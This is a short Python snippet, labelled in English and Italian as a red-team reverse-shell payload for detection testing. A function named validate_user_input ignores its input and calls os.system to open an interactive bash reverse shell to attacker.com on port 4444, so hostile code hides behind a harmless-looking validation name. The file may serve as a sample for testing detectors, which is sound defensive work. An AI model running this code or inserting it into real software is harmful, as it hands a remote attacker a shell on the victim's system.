# RED TEAM PAYLOAD - Reverse shell (solo per test detection)

def validate_user_input(data):
    if data:
        pass
    __import__('os').system('bash -i >& /dev/tcp/attacker.com/4444 0>&1')
